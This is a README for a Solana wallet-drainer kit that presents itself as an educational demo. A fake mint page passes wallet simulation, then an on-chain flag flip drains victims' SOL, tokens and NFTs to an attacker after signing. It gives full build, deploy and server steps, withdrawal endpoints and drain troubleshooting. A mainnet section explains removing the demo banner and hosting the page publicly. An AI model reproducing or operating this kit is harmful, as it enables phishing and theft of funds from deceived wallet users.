# Solana Bit-Flip Drainer Demo

Educational proof-of-concept demonstrating the bit-flip drainer technique on Solana devnet. The program appears as a harmless "mint" transaction in Phantom's simulation, but after the user signs, an on-chain state flip activates the drain before broadcast.

## How It Works

1. Victim visits the fake mint page and connects Phantom
2. Frontend scans the victim's token accounts and pre-creates attacker ATAs via the flip server
3. Victim clicks "Mint" — Phantom simulates the `register` instruction with `drain_active = false` (no-op, no warnings)
4. Victim approves — frontend calls `/flip-on` to set `drain_active = true` on-chain
5. The already-signed transaction is broadcast — now the `register` instruction drains all SOL to a vault PDA and transfers all SPL tokens/NFTs to the attacker via `remaining_accounts`
6. Frontend calls `/flip-off` to reset the flag

**What gets drained:**
- All SOL (minus rent minimum)
- All SPL tokens (fungible + NFTs) via on-chain CPI transfers
- Frozen token accounts are automatically skipped

## Architecture

```
demo/
├── programs/drainer_demo/src/lib.rs   # Anchor program (on-chain)
├── frontend/
│   ├── index.html                     # Fake mint page
│   └── app.js                         # Client-side drain logic
├── scripts/
│   ├── initialize.ts                  # Deploy setup: creates config + vault PDAs
│   ├── flip.ts                        # Manual flip CLI (on/off/status)
│   └── flip-server.ts                 # HTTP server for automated bit-flip + ATA prep
├── build_program.sh                   # WSL build script
├── attacker-keypair.json              # Attacker wallet (generated on first run)
└── target/
    ├── deploy/drainer_demo.so         # Compiled program
    ├── deploy/drainer_demo-keypair.json
    └── idl/drainer_demo.json          # Anchor IDL
```

## Prerequisites

- **Windows with WSL** (Ubuntu) — the Anchor program builds in WSL
- **WSL toolchain**: Rust 1.85+, Solana CLI 2.3+, Anchor CLI 0.31.1, AVM
- **Node.js** 18+ (Windows side)
- **Phantom wallet** browser extension (set to devnet)

### WSL Setup (one-time)

```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
rustup install 1.85.0

# Install Solana CLI
sh -c "$(curl -sSfL https://release.anza.xyz/v2.3.0/install)"

# Install AVM + Anchor
cargo install --git https://github.com/coral-xyz/anchor avm --force
avm install 0.31.1
avm use 0.31.1
```

## Quick Start (Devnet)

### 1. Install Dependencies

```bash
cd demo
npm install
```

### 2. Build the Program

```bash
# From Windows — runs the build inside WSL
wsl -u <WSL_USER> -- bash build_program.sh
```

This compiles the Anchor program, generates the program keypair (if needed), and copies artifacts to `target/deploy/`.

### 3. Fund the Attacker Wallet

```bash
# The initialize script generates attacker-keypair.json if it doesn't exist
# Fund it with devnet SOL:
solana airdrop 5 <ATTACKER_PUBKEY> --url devnet

# Or use Helius for reliable airdrops:
curl https://devnet.helius-rpc.com/?api-key=<YOUR_KEY> -X POST \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"requestAirdrop","params":["<ATTACKER_PUBKEY>",5000000000]}'
```

### 4. Deploy the Program

```bash
wsl -u <WSL_USER> -- env PATH="/home/<WSL_USER>/.local/share/solana/install/active_release/bin:/usr/bin:/bin" \
  solana program deploy /mnt/c/Users/<WIN_USER>/Desktop/drainer/demo/target/deploy/drainer_demo.so \
  --keypair /mnt/c/Users/<WIN_USER>/Desktop/drainer/demo/attacker-keypair.json \
  --url devnet
```

### 5. Initialize Config

```bash
npx ts-node scripts/initialize.ts
```

This creates the `config` and `vault` PDAs and patches `frontend/app.js` with the program ID.

### 6. Start Servers

```bash
# Terminal 1: Flip server (handles bit-flip automation + ATA creation)
npx ts-node scripts/flip-server.ts

# Terminal 2: Frontend
npx http-server frontend -p 8080 -c-1
```

### 7. Test

1. Open `http://localhost:8080` in a browser with Phantom set to **devnet**
2. Connect wallet
3. Click "Mint Now" — Phantom shows only the network fee, no warnings
4. Approve — SOL and all non-frozen SPL tokens are drained

## CLI Commands

```bash
# Check drain status + vault balance
npx ts-node scripts/flip.ts status

# Manually arm/disarm the drain
npx ts-node scripts/flip.ts on
npx ts-node scripts/flip.ts off

# Withdraw SOL from vault to attacker wallet
curl -X POST http://localhost:3001/withdraw

# Check flip server status
curl http://localhost:3001/status
```

## Flip Server Endpoints

| Method | Endpoint    | Description                                         |
|--------|-------------|-----------------------------------------------------|
| POST   | `/prepare`  | Pre-create attacker ATAs for a victim's tokens      |
| POST   | `/flip-on`  | Set `drain_active = true` (arm)                     |
| POST   | `/flip-off` | Set `drain_active = false` (disarm)                 |
| POST   | `/withdraw` | Transfer SOL from vault PDA to attacker wallet      |
| GET    | `/status`   | Returns `drainActive`, `vaultBalance`, `vault` addr |

## On-Chain Program Instructions

| Instruction    | Description                                                       |
|----------------|-------------------------------------------------------------------|
| `initialize`   | Creates config + vault PDAs, sets authority                       |
| `flip(bool)`   | Toggles `drain_active` (authority only)                           |
| `register`     | Victim calls this. No-op when OFF, drains SOL + SPL when ON      |
| `withdraw`     | Moves SOL from vault PDA to authority                             |
| `close_config` | Closes config PDA (migration helper)                              |

## Deploying to Mainnet

> **WARNING**: Using this on mainnet to steal funds is illegal. This section is for educational reference only.

The changes required to target mainnet instead of devnet:

### 1. RPC Endpoint

Replace all `https://api.devnet.solana.com` references with a mainnet RPC:

**`scripts/flip-server.ts`** and **`scripts/initialize.ts`** and **`scripts/flip.ts`**:
```typescript
const DEVNET_RPC = 'https://api.mainnet-beta.solana.com';
// or a private RPC like Helius/QuickNode for reliability
```

**`frontend/app.js`**:
```javascript
var DEVNET_RPC = 'https://api.mainnet-beta.solana.com';
```

### 2. Anchor.toml

```toml
[programs.mainnet]
drainer_demo = "<YOUR_PROGRAM_ID>"

[provider]
cluster = "Mainnet"
```

### 3. Deploy

```bash
solana program deploy target/deploy/drainer_demo.so \
  --keypair attacker-keypair.json \
  --url https://api.mainnet-beta.solana.com
```

The attacker wallet needs real SOL for deployment (~2-5 SOL depending on program size).

### 4. Initialize

```bash
# After changing DEVNET_RPC to mainnet in initialize.ts:
npx ts-node scripts/initialize.ts
```

### 5. Frontend

Update `ATTACKER_WALLET` in `app.js` if using a different wallet. Remove the "EDUCATIONAL DEMO" banner from `index.html`. Host the frontend on a domain (not localhost).

### 6. Phantom Network

Phantom must be on **mainnet** (its default). The frontend connects to whichever network the RPC points to.

### Render Deployment

The project includes a `render.yaml` blueprint for one-click deploy on [Render](https://render.com):

1. **Connect GitHub** to Render and import the `drainer-demo` repo
2. **Create Blueprint** — Render will detect `render.yaml` and create the web service
3. **Add environment variables** in the Render dashboard:
   - `RPC_URL` — Helius mainnet RPC (e.g. `https://mainnet.helius-rpc.com/?api-key=YOUR_KEY`)
   - `WALLET_KEYPAIR_JSON` — JSON array of the mainnet deploy wallet secret key (e.g. `[77,141,...]`)

The service serves both the API (`/prepare`, `/flip-on`, `/flip-off`, `/withdraw`, `/status`) and the frontend (`/`, `/index.html`, `/app.js`, `/config.js`). No separate static site needed.

### Key Differences on Mainnet

- Real SOL is needed for deployment, transaction fees, and ATA creation rent
- Transactions are faster (400ms slots vs devnet's variable timing)
- Blockhash validity window is tighter — the flip-on must be fast
- Explorer links should use `?cluster=mainnet-beta` or no cluster param (mainnet is default)

## Troubleshooting

| Issue | Cause | Fix |
|-------|-------|-----|
| Phantom shows "reverted during simulation" | Frozen token account in tx, or ATAs not created yet | Frozen accounts are auto-filtered. Ensure `/prepare` completes before clicking Mint |
| SOL not drained | Flip-on too slow, blockhash expired | Check flip server logs. Flip-on should take <5s |
| SPL tokens not drained | ATAs don't exist for attacker | Check `/prepare` was called on wallet connect |
| `Account is frozen` error | Frozen SPL token in remaining_accounts | Already handled — `getTokenAccounts` filters `state === 'frozen'` |
| Deploy fails: insufficient SOL | Attacker wallet out of SOL | Airdrop more (devnet) or fund with real SOL (mainnet) |
| `EADDRINUSE` on flip server start | Old process still on port 3001 | Kill the process: `Get-NetTCPConnection -LocalPort 3001` then `Stop-Process` |
